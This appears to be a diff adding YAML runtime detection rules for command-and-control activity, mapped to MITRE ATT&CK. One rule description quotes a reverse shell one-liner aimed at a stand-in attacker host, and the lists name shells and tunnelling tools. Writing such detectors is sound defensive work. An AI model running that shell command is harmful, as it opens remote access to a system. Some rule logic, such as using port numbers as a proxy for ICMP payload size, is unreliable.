@@ -1,0 +1,175 @@
+rules:
+  # MITRE ATT&CK: T1071.001 — Application Layer Protocol: Web Protocols
+  - id: c2_reverse_shell_standard_ports
+    name: "Reverse shell — outbound connection on standard ports from unexpected process"
+    description: >
+      A shell (bash, sh, zsh) opened a network connection. Legitimate shells
+      should not make direct network connections — this is the canonical
+      reverse shell indicator (`bash -i >& /dev/tcp/attacker/4444 0>&1`).
+    event_type: network
+    condition_group:
+      operator: and
+      conditions:
+        - field: proc.comm
+          op: in
+          values: ["bash", "sh", "zsh", "dash", "ksh", "tcsh", "fish"]
+        - field: network.dport
+          op: not_in
+          values: ["53", "123"]   # allow DNS and NTP from shell utilities
+    severity: critical
+    action: alert
+    tags: [mitre:T1071.001, command-and-control, reverse-shell]
+
+  # MITRE ATT&CK: T1095 — Non-Application Layer Protocol
+  - id: c2_raw_socket_shell
+    name: "Shell using raw socket"
+    description: >
+      A shell process opened a raw socket (SOCK_RAW). Raw sockets bypass
+      the normal TCP/UDP stack and are used for covert channels, ICMP tunnels,
+      and custom C2 protocols.
+    event_type: syscall
+    condition_group:
+      operator: and
+      conditions:
+        - field: proc.comm
+          op: in
+          values: ["bash", "sh", "zsh", "python3", "python", "perl", "ruby"]
+        - field: syscall.nr
+          op: equals
+          values: ["41"]   # socket
+    severity: warning
+    action: alert
+    tags: [mitre:T1095, command-and-control]
+
+  # MITRE ATT&CK: T1132.001 — Data Encoding: Standard Encoding
+  - id: c2_periodic_beacon_pattern
+    name: "Periodic small outbound connection — C2 beacon pattern"
+    description: >
+      Very short-lived outbound TCP connections at regular intervals.
+      C2 beaconing typically uses short keep-alive connections to check
+      for tasking without generating sustained bandwidth.
+    event_type: network
+    condition_group:
+      operator: and
+      conditions:
+        - field: network.dport
+          op: not_in
+          values: ["22", "53", "80", "123", "443", "5353"]
+        - field: proc.comm
+          op: not_in
+          values: ["curl", "wget", "apt", "yum", "dnf", "pip", "pip3",
+                   "npm", "yarn", "gem", "cargo", "go", "gradle", "mvn",
+                   "prometheus", "grafana", "node_exporter", "telegraf",
+                   "filebeat", "fluentd", "vector"]
+    severity: info
+    action: alert
+    tags: [mitre:T1132.001, command-and-control, beaconing]
+
+  # MITRE ATT&CK: T1090.001 — Proxy: Internal Proxy
+  - id: c2_connect_to_tor_port
+    name: "Connection to Tor default ports"
+    description: >
+      An outbound connection was made to Tor default ports (9050, 9150).
+      Attackers use Tor to route C2 traffic and make attribution impossible.
+    event_type: network
+    condition:
+      field: network.dport
+      op: in
+      values: ["9050", "9150", "9051", "9151"]
+    severity: critical
+    action: alert
+    tags: [mitre:T1090.001, command-and-control, tor]
+
+  # MITRE ATT&CK: T1571 — Non-Standard Port
+  - id: c2_high_port_outbound
+    name: "Outbound connection to non-standard high port"
+    description: >
+      A system process connected to a high-numbered port (>40000) on an
+      external host. Common C2 frameworks (Cobalt Strike, Metasploit,
+      Empire) default to high ports to avoid detection.
+    event_type: network
+    condition_group:
+      operator: and
+      conditions:
+        - field: network.dport
+          op: gt
+          values: ["40000"]
+        - field: proc.comm
+          op: not_in
+          values: ["kubectl", "docker", "containerd", "etcd", "kube-proxy",
+                   "prometheus", "grafana", "alertmanager", "jaeger",
+                   "envoy", "istio-proxy", "linkerd"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1571, command-and-control]
+
+  # MITRE ATT&CK: T1102 — Web Service (C2 via pastebin, github, etc.)
+  - id: c2_paste_site_access
+    name: "Connection to paste / dead-drop site"
+    description: >
+      A process accessed a known paste or dead-drop site (pastebin, ghostbin,
+      dpaste, etc.) from a server environment. Attackers use these sites to
+      host second-stage payloads and C2 instructions.
+    event_type: dns
+    condition:
+      field: dns.qname
+      op: in
+      values:
+        - "pastebin.com"
+        - "ghostbin.co"
+        - "paste.ee"
+        - "dpaste.org"
+        - "paste.ubuntu.com"
+        - "hastebin.com"
+        - "termbin.com"
+        - "ix.io"
+        - "sprunge.us"
+        - "0bin.net"
+    severity: warning
+    action: alert
+    tags: [mitre:T1102, command-and-control, exfiltration]
+
+  # MITRE ATT&CK: T1219 — Remote Access Software
+  - id: c2_remote_access_tool
+    name: "Remote access tool binary executed"
+    description: >
+      A known remote access tool (RAT) binary was executed. These tools
+      provide full C2 capability and are never expected in production
+      Kubernetes workloads.
+    event_type: syscall
+    condition_group:
+      operator: and
+      conditions:
+        - field: proc.comm
+          op: in
+          values: ["ngrok", "frp", "frpc", "frps", "chisel", "ligolo",
+                   "rathole", "bore", "cloudflared", "teleport",
+                   "teamviewer", "anydesk", "vnc", "vncserver",
+                   "x11vnc", "tmate", "gotty"]
+        - field: syscall.nr
+          op: equals
+          values: ["59"]
+    severity: warning
+    action: alert
+    tags: [mitre:T1219, command-and-control, remote-access]
+
+  # MITRE ATT&CK: T1008 — Fallback Channels
+  - id: c2_icmp_large_payload
+    name: "Large ICMP packet — possible ICMP tunnel"
+    description: >
+      An ICMP packet larger than 200 bytes was sent or received. Normal ping
+      uses 64-byte packets; ICMP tunneling tools (icmptunnel, ptunnel) encode
+      data in oversized ICMP payloads to create covert C2 channels.
+    event_type: network
+    condition_group:
+      operator: and
+      conditions:
+        - field: network.proto
+          op: equals
+          values: ["1"]     # IPPROTO_ICMP
+        - field: network.dport
+          op: gt
+          values: ["200"]   # payload size proxy via dport field
+    severity: warning
+    action: alert
+    tags: [mitre:T1008, command-and-control, covert-channel]
